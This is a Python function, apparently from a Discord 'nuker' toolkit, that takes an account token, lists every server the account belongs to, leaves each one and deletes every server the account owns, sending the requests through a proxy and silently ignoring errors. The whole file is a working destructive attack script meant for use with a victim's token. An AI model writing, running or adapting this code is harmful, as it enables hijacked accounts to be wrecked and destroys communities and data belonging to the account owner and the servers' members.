import requests
import Solutions

from colorama import Fore

from util.plugins.common import print_slow, getheaders, proxy

def Leaver(token):
    count = 0
    #get all servers
    guildsIds = requests.get("https://discord.com/api/v8/users/@me/guilds", headers=getheaders(token)).json()
    for guild in guildsIds:
        try:
            #Leave servers the user is in
            requests.delete(
                f'https://discord.com/api/v8/users/@me/guilds/'+guild['id'], proxies={"ftp": f'{proxy()}'}, headers={'Authorization': token})
            count += 1
            print(f"{Fore.YELLOW}Left guild: {Fore.WHITE}"+guild['name']+Fore.RESET)
        except Exception as e:
            print(f"The following error has been encountered and is being ignored: {e}")

    for guild in guildsIds:
        try:
            #Delete the servers the user owns
            requests.delete(f'https://discord.com/api/v8/guilds/'+guild['id'], proxies={"ftp": f'{proxy()}'}, headers={'Authorization': token})
            count += 1
            print(f'{Fore.LIGHTRED_EX}Deleted guild: {Fore.WHITE}'+guild['name']+Fore.RESET)
        except Exception as e:
            print(f"The following error has been encountered and is being ignored: {e}")
    print_slow(f"{Fore.LIGHTGREEN_EX}Successfully left {count} servers! ")
    print("Enter anything to continue. . . ", end="")
    input()
    Solutions.main()